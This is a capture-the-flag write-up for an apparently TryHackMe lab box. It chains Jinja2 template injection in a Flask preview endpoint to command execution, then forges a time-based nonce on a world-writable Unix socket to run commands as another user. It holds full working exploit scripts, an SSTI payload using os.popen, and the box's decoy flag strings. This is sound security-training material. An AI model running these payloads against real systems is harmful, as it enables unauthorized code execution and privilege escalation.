### Summary

The nginx site is a Flask "Anadyne Console" whose alert preview endpoint passes user input to Jinja2 `render_template_string`, which gives server-side template injection and code execution as `analyst`. The `analyst` user can reach the world-writable Unix socket `/run/sentinel/ctrl.sock`, served by a daemon running as `sentinel`. Its real dispatch table has a `shell` op gated only by a one-minute nonce whose salt and algorithm are in world-readable source, so a command sent through it runs as `sentinel`, who can read the real user flag `/var/lib/warden/real/user.txt`.

### Steps

1. Recon. Only ports 22 (SSH) and 80 (nginx) are open. The site redirects to `/login`, which prints the dev credentials `analyst` / `analyst`.
   ```sh
   nmap -Pn -sV -p- 10.48.183.207
   curl -s http://10.48.183.207/login
   ```
   Output of the scan (short):
   ```text
   22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u10 (protocol 2.0)
   80/tcp open  http    nginx 1.22.1
   ```

2. Find the SSTI. After logging in (Flask session cookie `{"user":"analyst"}`), each alert advertises `POST /api/alert/preview` with JSON `{"title":"...","body":"..."}`. The fields are rendered with Jinja2, so `{{7*7}}` comes back as `49`.
   ```sh
   curl -s -b cj -H 'Content-Type: application/json' \
     -d '{"title":"x","body":"{{7*7}}"}' http://10.48.183.207/api/alert/preview
   ```

3. Turn the SSTI into command execution as `analyst` (uid 1001, groups `analyst` and `echo-log`). `scripts/ssti_rce.sh` logs in, base64-encodes the command to avoid Jinja quoting problems, and runs it through `os.popen` reached from the `cycler` global.
   ```sh
   TARGET=10.48.183.207 ./scripts/ssti_rce.sh 'id'
   # uid=1001(analyst) ... groups=1001(analyst),1004(echo-log)
   ```

4. Enumerate. The real user flag is `/var/lib/warden/real/user.txt` (`sentinel:sentinel`, mode 640), so `analyst` cannot read it. The world-readable files in `/var/lib/warden/decoy/` are traps. A root `warden` process atomically swaps the `/etc/sentinel/dispatch.json` symlink between the real and decoy dispatch tables.

5. Read the daemon source. `/opt/sentinel/sentinel.py` is world-readable and runs as `sentinel` on `/run/sentinel/ctrl.sock` (mode 0666). Its real dispatch contains `{"shell":{"handler":"exec_shell","gate":"nonce_time"}}`, which runs `/bin/sh -c <payload>` as `sentinel`. The gate is a nonce computed as `sha256(f"{int(time())//60}:{SALT}")[:16]` with `SALT="sentinel-salt-v1-a3b7c2d9"`, accepted with one minute of slack on either side. The socket protocol is one JSON line: `{"op":"shell","nonce":<n>,"payload":<base64 sh command>}`.

6. Send the request from the box. The nonce depends on the target clock, so `scripts/sentinel_shell.py` must run on the target. It is delivered through the analyst SSTI (base64 copy to `/tmp`), then run with the command to execute as `sentinel`.
   ```sh
   B=$(base64 -w0 scripts/sentinel_shell.py)
   TARGET=10.48.183.207 ./scripts/ssti_rce.sh \
     "echo $B | base64 -d > /tmp/.ss.py; python3 /tmp/.ss.py 'id; cat /var/lib/warden/real/user.txt'"
   # uid=1003(sentinel) ...
   # isfcr{REDACTED}
   ```

### Scripts

#### scripts/ssti_rce.sh

Runs a shell command as `analyst` through the preview SSTI. Usage: `TARGET=10.48.183.207 ./scripts/ssti_rce.sh 'id'`. The `TARGET` variable defaults to `10.48.183.207`.

```bash
#!/usr/bin/env bash
# SSTI RCE against the Anadyne Console /api/alert/preview endpoint.
# Jinja2 render_template_string on the "body" field runs as user analyst.
# Usage: ./ssti_rce.sh '<shell command>'
# Env: TARGET (default 10.48.183.207), creds analyst/analyst.
set -euo pipefail
TARGET="${TARGET:-10.48.183.207}"
CMD="${1:?usage: ssti_rce.sh <command>}"
CJ="$(mktemp)"; trap 'rm -f "$CJ"' EXIT

curl -s -c "$CJ" -b "$CJ" -d 'username=analyst&password=analyst' \
  "http://$TARGET/login" >/dev/null

# base64 the command to avoid quoting/escaping issues in the Jinja payload
B64=$(printf '%s' "$CMD" | base64 -w0)
PY="cycler.__init__.__globals__.os.popen('echo $B64|base64 -d|sh 2>&1').read()"
BODY=$(printf '{"title":"x","body":"{{ %s }}"}' "$PY")

curl -s -b "$CJ" -H 'Content-Type: application/json' -d "$BODY" \
  "http://$TARGET/api/alert/preview" \
  | python3 -c 'import sys,json; d=json.load(sys.stdin); print(d["html"].split("preview-body'"'"'>",1)[1].rsplit("</div>",1)[0])'
```

#### scripts/sentinel_shell.py

Runs on the target, not on the attacker machine. It computes the current minute nonce from the local clock, connects to `/run/sentinel/ctrl.sock`, and sends the `shell` op, so the command runs as `sentinel`. Deliver it through `ssti_rce.sh` as shown in step 6, then run `python3 /tmp/.ss.py '<cmd>'`.

```python
#!/usr/bin/env python3
"""Run a command as the `sentinel` user via the ctrl.sock `shell` dispatch.

Runs ON the target (needs its clock for the minute-nonce and local socket).
Delivered through the analyst SSTI RCE. The real dispatch table exposes
op=shell -> exec_shell, gated by a world-readable minute nonce.

Usage: python3 sentinel_shell.py '<shell command>'
"""
import base64, hashlib, json, socket, sys, time

SOCK = "/run/sentinel/ctrl.sock"
SALT = "sentinel-salt-v1-a3b7c2d9"

def nonce(off=0):
    t = (int(time.time()) // 60) + off
    return hashlib.sha256(f"{t}:{SALT}".encode()).hexdigest()[:16]

cmd = sys.argv[1] if len(sys.argv) > 1 else "id"
req = {"op": "shell", "nonce": nonce(0),
       "payload": base64.b64encode(cmd.encode()).decode()}

s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.settimeout(10)
s.connect(SOCK)
s.sendall((json.dumps(req) + "\n").encode())
buf = b""
while b"\n" not in buf:
    ch = s.recv(4096)
    if not ch:
        break
    buf += ch
resp = json.loads(buf.split(b"\n", 1)[0])
if resp.get("ok"):
    sys.stdout.write(resp.get("stdout", ""))
    if resp.get("stderr"):
        sys.stderr.write(resp["stderr"])
else:
    print("ERROR:", resp, file=sys.stderr)
```

### Notes

- The target (`10.48.183.207`) was a volatile TryHackMe instance. The nonce depends on the target clock, so it must be computed on the box, not locally.
- The decoy flags `isfcr{echoes_sound_the_same}` (user) and `isfcr{s0_cl0se_but_s0_f4r}` (root) are world-readable in `/var/lib/warden/decoy/` and are not the answer.
- The `analyst` Flask login is the only credential needed. The real flag is read as `sentinel`, not `analyst`, so the socket hop is required.
- The `shell` op exists only in the real dispatch table. The warden swaps the `dispatch.json` symlink to the decoy table, which omits `shell`, so an `op not in dispatch` error means the decoy is being served, not a bad nonce.
- The root stage of the same box is the separate challenge `echochamber-root`, which reuses this foothold.
